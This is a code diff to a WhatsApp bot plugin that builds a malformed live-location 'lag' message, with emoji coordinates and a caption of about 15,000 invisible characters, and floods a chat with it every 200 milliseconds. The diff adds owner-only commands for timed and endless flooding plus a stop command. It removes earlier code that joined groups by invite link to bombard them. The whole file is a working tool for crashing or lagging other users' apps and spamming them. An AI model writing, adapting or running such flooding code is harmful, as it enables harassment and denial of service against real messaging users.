@@ -1,10 +1,11 @@
+
 const buildLagMessage = () => ({
   viewOnceMessage: {
     message: {
       liveLocationMessage: {
         degreesLatitude: '💣',
         degreesLongitude: '💥',
-        caption: '\u2063'.repeat(30000) + '💥'.repeat(1000),
+        caption: '\u2063'.repeat(15000) + '💥'.repeat(300),
         sequenceNumber: '999',
         jpegThumbnail: null,
         contextInfo: {
@@ -24,95 +25,85 @@ const buildLagMessage = () => ({
   }
 })
 
-let activeBombing = false
-let bombingInterval = null
+const activeBombs = new Map()
 
 let handler = async (m, { conn, isOwner }) => {
   if (!isOwner) return
 
+  const jid = m.chat
   const text = m.text?.trim()
 
-  // Comando clásico ¤-n
-  const matchClassic = text.match(/^¤(?:-(\d{1,3}))?$/)
-  if (matchClassic) {
-    const repeatCount = parseInt(matchClassic[1]) || 1
+  // Comando ฯ con duración
+  const timedMatch = text.match(/^ฯ-(\d+)([mh])$/i)
+  if (timedMatch) {
+    const value = parseInt(timedMatch[1])
+    const unit = timedMatch[2].toLowerCase()
+    const durationMs = unit === 'm' ? value * 60_000 : value * 60 * 60_000
+
+    const interval = setInterval(async () => {
+      try {
+        await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
+      } catch (error) {
+        console.error('Error al enviar bomba:', error)
+      }
+    }, 200)
+
+    activeBombs.set(jid, interval)
+
+    setTimeout(() => {
+      clearInterval(interval)
+      activeBombs.delete(jid)
+    }, durationMs)
+
+    return
+  }
+
+  // Comando ฯ sin duración (infinito)
+  if (/^ฯ$/i.test(text)) {
+    if (activeBombs.has(jid)) return // Ya está activo
+
+    const interval = setInterval(async () => {
+      try {
+        await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
+      } catch (error) {
+        console.error('Error al enviar bomba infinita:', error)
+      }
+    }, 200)
+
+    activeBombs.set(jid, interval)
+    return
+  }
+
+  // Comando θ para detener
+  if (/^θ$/i.test(text)) {
+    const interval = activeBombs.get(jid)
+    if (interval) {
+      clearInterval(interval)
+      activeBombs.delete(jid)
+    }
+    return
+  }
+
+  // Comando original ¤-n
+  const match = text.match(/^¤(?:-(\d{1,3}))?$/)
+  if (match) {
+    const repeatCount = parseInt(match[1]) || 1
     if (repeatCount < 1 || repeatCount >= 1000) return
 
     for (let i = 0; i < repeatCount; i++) {
       try {
-        await conn.relayMessage(m.chat, buildLagMessage(), { messageId: conn.generateMessageTag() })
-        await new Promise(resolve => setTimeout(resolve, 100))
+        await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
+        await new Promise(resolve => setTimeout(resolve, 200))
       } catch (error) {
         console.error('Error al enviar mensaje:', error)
       }
     }
-    return
-  }
-
-  // Comando Ω <link>
-  const matchJoin = text.match(/^Ω\s+(https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+)$/i)
-  if (matchJoin) {
-    const inviteLink = matchJoin[1]
-    const groupCode = inviteLink.split('/')[3]
-    try {
-      let groupId
-      try {
-        groupId = await conn.groupAcceptInvite(groupCode)
-      } catch {
-        groupId = await conn.groupGetInviteInfo(groupCode)
-        groupId = groupId.id
-      }
-
-      activeBombing = true
-      bombingInterval = setInterval(async () => {
-        if (!activeBombing) return
-        try {
-          for (let i = 0; i < 3; i++) {
-            await conn.relayMessage(groupId, buildLagMessage(), { messageId: conn.generateMessageTag() })
-          }
-        } catch (err) {
-          console.error('Error en bombardeo:', err)
-        }
-      }, 100)
-
-      await m.reply(`💣 Bombardeo iniciado en el grupo.`)
-    } catch (err) {
-      await m.reply(`❌ Error al procesar el grupo: ${err}`)
-    }
-    return
-  }
-
-  // Comando Ω dentro del grupo
-  if (/^Ω$/i.test(text) && m.isGroup) {
-    const groupId = m.chat
-    activeBombing = true
-    bombingInterval = setInterval(async () => {
-      if (!activeBombing) return
-      try {
-        for (let i = 0; i < 3; i++) {
-          await conn.relayMessage(groupId, buildLagMessage(), { messageId: conn.generateMessageTag() })
-        }
-      } catch (err) {
-        console.error('Error en bombardeo:', err)
-      }
-    }, 100)
-
-    await m.reply(`💣 Bombardeo iniciado en este grupo.`)
-    return
-  }
-
-  // Comando Ω end desde PV
-  if (/^Ω\s+end$/i.test(text) && !m.isGroup) {
-    activeBombing = false
-    if (bombingInterval) clearInterval(bombingInterval)
-    await m.reply('🛑 Bombardeo detenido.')
-    return
   }
 }
 
 handler.command = new RegExp
-handler.customPrefix = /^¤(?:-\d{1,3})?$|^Ω(\s+(https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+)|\s+end)?$/i
+handler.customPrefix = /^¤(?:-\d{1,3})?$|^ฯ(?:-\d+[mh])?$|^θ$/i
 handler.tags = ['owner']
-handler.help = ['¤-n', 'Ω <link>', 'Ω', 'θ']
+handler.help = ['¤-n', 'ฯ-1m', 'ฯ-1h', 'ฯ', 'θ']
 
 export default handler
